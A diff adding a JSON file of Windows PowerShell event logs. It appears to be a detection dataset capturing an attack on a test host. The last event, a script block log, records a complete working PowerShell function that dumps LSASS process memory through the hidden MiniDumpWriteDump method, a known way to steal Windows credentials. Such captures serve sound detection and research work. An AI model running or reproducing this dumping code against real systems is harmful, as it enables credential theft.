@@ -1,0 +1,188 @@
+[
+    {
+        "Event": {
+            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
+            "System": {
+                "Provider": {
+                    "@Name": "Microsoft-Windows-PowerShell",
+                    "@Guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"
+                },
+                "EventID": {
+                    "@Qualifiers": "",
+                    "#text": "40961"
+                },
+                "Version": "1",
+                "Level": "4",
+                "Task": "4",
+                "Opcode": "1",
+                "Keywords": "0x0000000000000000",
+                "TimeCreated": {
+                    "@SystemTime": "2020-06-30 14:23:58.394424+00:00"
+                },
+                "EventRecordID": "968",
+                "Correlation": {
+                    "@ActivityID": "{4aa5eae3-4f33-0000-501d-a64a334fd601}",
+                    "@RelatedActivityID": ""
+                },
+                "Execution": {
+                    "@ProcessID": "7008",
+                    "@ThreadID": "5532"
+                },
+                "Channel": "Microsoft-Windows-PowerShell/Operational",
+                "Computer": "MSEDGEWIN10",
+                "Security": {
+                    "@UserID": "S-1-5-21-3461203602-4096304019-2269080069-1000"
+                }
+            },
+            "EventData": null
+        }
+    },
+    {
+        "Event": {
+            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
+            "System": {
+                "Provider": {
+                    "@Name": "Microsoft-Windows-PowerShell",
+                    "@Guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"
+                },
+                "EventID": {
+                    "@Qualifiers": "",
+                    "#text": "53504"
+                },
+                "Version": "1",
+                "Level": "4",
+                "Task": "111",
+                "Opcode": "10",
+                "Keywords": "0x0000000000000000",
+                "TimeCreated": {
+                    "@SystemTime": "2020-06-30 14:23:58.440338+00:00"
+                },
+                "EventRecordID": "969",
+                "Correlation": {
+                    "@ActivityID": "{4aa5eae3-4f33-0000-501d-a64a334fd601}",
+                    "@RelatedActivityID": ""
+                },
+                "Execution": {
+                    "@ProcessID": "7008",
+                    "@ThreadID": "1916"
+                },
+                "Channel": "Microsoft-Windows-PowerShell/Operational",
+                "Computer": "MSEDGEWIN10",
+                "Security": {
+                    "@UserID": "S-1-5-21-3461203602-4096304019-2269080069-1000"
+                }
+            },
+            "EventData": {
+                "Data": [
+                    {
+                        "@Name": "param1",
+                        "#text": "7008"
+                    },
+                    {
+                        "@Name": "param2",
+                        "#text": "DefaultAppDomain"
+                    }
+                ]
+            }
+        }
+    },
+    {
+        "Event": {
+            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
+            "System": {
+                "Provider": {
+                    "@Name": "Microsoft-Windows-PowerShell",
+                    "@Guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"
+                },
+                "EventID": {
+                    "@Qualifiers": "",
+                    "#text": "40962"
+                },
+                "Version": "1",
+                "Level": "4",
+                "Task": "4",
+                "Opcode": "2",
+                "Keywords": "0x0000000000000000",
+                "TimeCreated": {
+                    "@SystemTime": "2020-06-30 14:23:58.532114+00:00"
+                },
+                "EventRecordID": "970",
+                "Correlation": {
+                    "@ActivityID": "{4aa5eae3-4f33-0000-501d-a64a334fd601}",
+                    "@RelatedActivityID": ""
+                },
+                "Execution": {
+                    "@ProcessID": "7008",
+                    "@ThreadID": "5532"
+                },
+                "Channel": "Microsoft-Windows-PowerShell/Operational",
+                "Computer": "MSEDGEWIN10",
+                "Security": {
+                    "@UserID": "S-1-5-21-3461203602-4096304019-2269080069-1000"
+                }
+            },
+            "EventData": null
+        }
+    },
+    {
+        "Event": {
+            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
+            "System": {
+                "Provider": {
+                    "@Name": "Microsoft-Windows-PowerShell",
+                    "@Guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"
+                },
+                "EventID": {
+                    "@Qualifiers": "",
+                    "#text": "4104"
+                },
+                "Version": "1",
+                "Level": "3",
+                "Task": "2",
+                "Opcode": "15",
+                "Keywords": "0x0000000000000000",
+                "TimeCreated": {
+                    "@SystemTime": "2020-06-30 14:24:08.254604+00:00"
+                },
+                "EventRecordID": "971",
+                "Correlation": {
+                    "@ActivityID": "{4aa5eae3-4f33-0001-3a2b-a64a334fd601}",
+                    "@RelatedActivityID": ""
+                },
+                "Execution": {
+                    "@ProcessID": "7008",
+                    "@ThreadID": "6488"
+                },
+                "Channel": "Microsoft-Windows-PowerShell/Operational",
+                "Computer": "MSEDGEWIN10",
+                "Security": {
+                    "@UserID": "S-1-5-21-3461203602-4096304019-2269080069-1000"
+                }
+            },
+            "EventData": {
+                "Data": [
+                    {
+                        "@Name": "MessageNumber",
+                        "#text": "1"
+                    },
+                    {
+                        "@Name": "MessageTotal",
+                        "#text": "1"
+                    },
+                    {
+                        "@Name": "ScriptBlockText",
+                        "#text": "function Memory($path)\n{\n\t\t\t  \n\t\t\t  \n\t\t$Process = Get-Process lsass\n\t\t$DumpFilePath = $path\n\t\t\n\t\t$WER = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting')\n\t\t$WERNativeMethods = $WER.GetNestedType('NativeMethods', 'NonPublic')\n\t\t$Flags = [Reflection.BindingFlags] 'NonPublic, Static'\n\t\t$MiniDumpWriteDump = $WERNativeMethods.GetMethod('MiniDumpWriteDump', $Flags)\n\t\t$MiniDumpWithFullMemory = [UInt32] 2\n\t\n\t\t\t\n\t\t\t  #\n\t\t$ProcessId = $Process.Id\n\t\t$ProcessName = $Process.Name\n\t\t$ProcessHandle = $Process.Handle\n\t\t$ProcessFileName = \"$($ProcessName).dmp\"\n\t\t\n\t\t$ProcessDumpPath = Join-Path $DumpFilePath $ProcessFileName\n\t\t\n\t\t$FileStream = New-Object IO.FileStream($ProcessDumpPath, [IO.FileMode]::Create)\n\t\t\t  \n\t\t$Result = $MiniDumpWriteDump.Invoke($null, @($ProcessHandle,\n\t\t\t\t\t\t\t\t\t\t\t\t\t$ProcessId,\n\t\t\t\t\t\t\t\t\t\t\t\t\t$FileStream.SafeFileHandle,\n\t\t\t\t\t\t\t\t\t\t\t\t\t$MiniDumpWithFullMemory,\n\t\t\t\t\t\t\t\t\t\t\t\t\t[IntPtr]::Zero,\n\t\t\t\t\t\t\t\t\t\t\t\t\t[IntPtr]::Zero,\n\t\t\t\t\t\t\t\t\t\t\t\t\t[IntPtr]::Zero))\n\t\t\t  \n\t\t$FileStream.Close()\n\t\t\n\t\tif (-not $Result)\n\t\t{\n\t\t\t$Exception = New-Object ComponentModel.Win32Exception\n\t\t\t$ExceptionMessage = \"$($Exception.Message) ($($ProcessName):$($ProcessId))\"\n\t\t\t\n\t\t\t# Remove any partially written dump files. For example, a partial dump will be written\n\t\t\t# in the case when 32-bit PowerShell tries to dump a 64-bit process.\n\t\t\tRemove-Item $ProcessDumpPath -ErrorAction SilentlyContinue\n\t\t\t\n\t\t\tthrow $ExceptionMessage\n\t\t}\n\t\telse\n\t\t{\n\t\t\t\"Memdump complete!\"\n\t\t}\n\t\n}"
+                    },
+                    {
+                        "@Name": "ScriptBlockId",
+                        "#text": "27f08bda-c330-419f-b83b-eb5c0f699930"
+                    },
+                    {
+                        "@Name": "Path",
+                        "#text": "C:\\Users\\Public\\lsass_wer_ps.ps1"
+                    }
+                ]
+            }
+        }
+    }
+]
